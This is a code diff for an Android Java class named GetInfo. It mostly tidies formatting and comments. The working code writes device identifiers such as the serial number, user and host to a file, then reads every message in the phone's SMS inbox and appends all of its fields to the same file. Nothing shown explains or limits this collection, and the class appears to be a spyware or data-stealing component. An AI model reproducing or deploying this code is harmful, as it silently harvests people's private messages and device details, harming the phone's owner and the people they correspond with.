@@ -30,28 +30,24 @@ public class GetInfo {
         information += "\n SERIAL: "          + android.os.Build.SERIAL;
         information += "\n USER: "            + android.os.Build.USER;
         information += "\n HOST: "            + android.os.Build.HOST;
-//
-////        String path = Environment.getExternalStorageDirectory().toString()+"/Pictures";
-////        Log.d("Files", "Path: " + path);
-////        File directory = new File(path);
-////        File[] files = directory.listFiles();
-////        Log.d("Files", "Size: "+ files.length);
-////        for (int i = 0; i < files.length; i++)
-////        {
-////            Log.d("Files", "FileName:" + files[i].getName());
-////        }
+
+        /* Write and create file */
+
         try{
             OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("information.txt", Context.MODE_PRIVATE));
-            outputStreamWriter.write(information+"\n");
+            outputStreamWriter.write(information + "\n");
             outputStreamWriter.close();
         }
+
         catch (IOException e) {
             Log.e("Error", "can't write to file. " + e.toString());
         }
-//
+
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
-        if (cursor.moveToFirst()) { // must check the result to prevent exception
+        /* Read phone SMS */
+
+        if (cursor.moveToFirst()) {
             do {
                 String msgData = "";
 
@@ -59,14 +55,19 @@ public class GetInfo {
                 {
                     msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                 }
+
+                /* Append to information.txt */
                 try{
                     OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("information.txt", Context.MODE_APPEND));
                     outputStreamWriter.append(msgData).append("\n");
                     outputStreamWriter.close();
                 }
+
                 catch (IOException e) {
+                    Log.e("Error", "can't append to file. " + e.toString());
                 }
-            } while (cursor.moveToNext());
+            }
+            while (cursor.moveToNext());
         }
     }
 }
